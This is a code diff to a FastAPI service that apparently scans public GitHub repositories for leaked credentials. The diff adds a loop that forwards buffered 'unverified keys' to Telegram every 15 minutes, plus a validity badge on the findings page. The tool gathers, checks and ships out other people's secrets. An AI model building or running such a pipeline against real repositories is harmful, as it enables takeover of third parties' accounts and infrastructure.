@@ -18,7 +18,7 @@ from fastapi.responses import HTMLResponse
 import db
 from config import SCAN_INTERVAL, HOURLY_ALERT, GITHUB_TOKENS, MAX_PAGES
 from scanner import run_cycle
-from notifier import notify_hourly_digest, notify_infra_hourly
+from notifier import notify_hourly_digest, notify_infra_hourly, flush_unverified_buffer
 from trufflehog_runner import trufflehog_loop
 
 logging.basicConfig(
@@ -36,6 +36,18 @@ async def _scan_loop():
             log.error("cycle crashed: %s", e)
         log.info("sleeping %ds until next cycle", SCAN_INTERVAL)
         await asyncio.sleep(SCAN_INTERVAL)
+
+
+async def _flush_loop():
+    """Flush buffered unverified keys to Telegram every 15 minutes."""
+    while True:
+        await asyncio.sleep(900)
+        try:
+            n = await flush_unverified_buffer()
+            if n:
+                log.info("flushed %d unverified keys to Telegram as text file", n)
+        except Exception as e:
+            log.error("flush loop err: %s", e)
 
 
 async def _hourly_alert_loop():
@@ -67,6 +79,7 @@ async def lifespan(app: FastAPI):
     tasks = [
         asyncio.create_task(_scan_loop(),          name="scan_loop"),
         asyncio.create_task(_hourly_alert_loop(),  name="hourly_alert"),
+        asyncio.create_task(_flush_loop(),         name="flush_buffer"),
         asyncio.create_task(trufflehog_loop(),     name="trufflehog"),
     ]
     yield
@@ -183,9 +196,12 @@ async def infra_page(risk: str = Query(None), limit: int = Query(200)):
         col = _RISK_COLOR.get(rl, "#888")
         bg  = _RISK_BG.get(rl, "#111")
         dest = f"<code>{r['destination']}</code>" if r.get("destination") else "—"
+        v = r.get("is_validated", -1)
+        val_badge = ("✅" if v == 1 else "❌" if v == 0 else "⏳")
         rows_html += (
             f"<tr style='background:{bg}'>"
             f"<td style='color:{col};font-weight:bold'>{rl.upper()}</td>"
+            f"<td>{val_badge}</td>"
             f"<td>{r['cred_type'].upper()}</td>"
             f"<td><code>{r['cred_preview']}</code></td>"
             f"<td>{dest}</td>"
@@ -228,7 +244,7 @@ async def infra_page(risk: str = Query(None), limit: int = Query(200)):
 {"<h3>Top Destinations</h3><table style='width:auto'><thead><tr><th>Host</th><th>Type</th><th>Count</th></tr></thead><tbody>" + by_dest_html + "</tbody></table>" if by_dest_html else ""}
 <h3>Findings ({risk or "all"}, limit {limit})</h3>
 <table>
-  <thead><tr><th>Risk</th><th>Type</th><th>Preview</th><th>Destination</th>
+  <thead><tr><th>Risk</th><th>Valid</th><th>Type</th><th>Preview</th><th>Destination</th>
   <th>Repo</th><th>Stars</th><th>File type</th><th>Found at</th></tr></thead>
   <tbody>{rows_html}</tbody>
 </table>
